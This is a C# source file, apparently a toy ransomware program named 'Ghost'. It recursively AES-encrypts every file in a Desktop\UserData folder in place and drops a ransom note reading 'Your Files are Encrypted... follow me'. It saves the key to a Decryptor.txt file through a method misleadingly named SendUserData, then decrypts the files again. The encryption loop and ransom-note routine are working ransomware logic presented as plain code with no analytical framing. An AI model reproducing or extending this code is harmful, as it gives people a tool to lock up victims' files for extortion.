using System.Security.Cryptography;

namespace Ghost
{
    public class GhostService : IGhostService
    {
        private static byte[] Key = null!;
        private static byte[] IV = null!;
        private static string User = string.Empty;

        private static void GenerateAesKey()
        {
            using (Aes aes = Aes.Create())
            {
                Key = aes.Key;
                IV = aes.IV;
            }
        }
        private static void EncryptFile(string filePath)
        {
            using Aes aes = Aes.Create();
            aes.Key = Key;
            aes.IV = IV;

            ICryptoTransform encryptor = aes.CreateEncryptor();
            byte[] originalBytes = File.ReadAllBytes(filePath);

            using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Write); 
            using CryptoStream cryptoStream = new(inputFileStream, encryptor, CryptoStreamMode.Write);
            cryptoStream.Write(originalBytes, 0, originalBytes.Length);
        }
        private static void DecryptFile(string filePath)
        {
            using Aes aes = Aes.Create();
            string[] decryptorData = File.ReadAllLines($"C:\\Users\\{User}\\Desktop\\Decryptor.txt");
            Key = Convert.FromBase64String(decryptorData[0]);
            IV = Convert.FromBase64String(decryptorData[1]);
            aes.Key = Key;
            aes.IV = IV;

            ICryptoTransform decryptor = aes.CreateDecryptor();

            byte[] originalBytes = File.ReadAllBytes(filePath);
            File.WriteAllText(filePath, string.Empty);

            using Stream stream = new MemoryStream(originalBytes);
            using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Write);
            using CryptoStream cryptoStream = new(inputFileStream, decryptor, CryptoStreamMode.Write);
            cryptoStream.Write(originalBytes, 0, originalBytes.Length);
        }
        private static void BeginEncryption(string folderPath)
        {
            string[] files = Directory.GetFiles(folderPath);

            foreach (string file in files)
                EncryptFile(file);

            string[] subdirectories = Directory.GetDirectories(folderPath);
            foreach (string subdirectory in subdirectories)
                BeginEncryption(subdirectory);
        }
        private static void BeginDecryption(string folderPath)
        {
            string[] files = Directory.GetFiles(folderPath);

            foreach (string file in files)
                DecryptFile(file);

            string[] subdirectories = Directory.GetDirectories(folderPath);
            foreach (string subdirectory in subdirectories)
                BeginDecryption(subdirectory);
        }
        private static void GenerateNote()
        {
            string fileName = $"ReadMe.txt";
            string message = "Your Files are Encrypted\n\nAttention:\n1. If you want restore your files, follow me";

            using StreamWriter writer = File.CreateText($"C:\\Users\\{User}\\Desktop\\{fileName}");
            writer.WriteLine(message);
        }
        private static void SendUserData()
        {
            using StreamWriter writer = File.CreateText($"C:\\Users\\{User}\\Desktop\\Decryptor.txt");
            writer.WriteLine($"{Convert.ToBase64String(Key)}\n{Convert.ToBase64String(IV)}");
        }
        public void Initialise()
        {
            User = Environment.UserName;
            GenerateAesKey();
            string target = $"C:\\Users\\{User}\\Desktop\\UserData";
            BeginEncryption(target);
            GenerateNote();
            SendUserData();
            BeginDecryption(target);
        }
    }
}
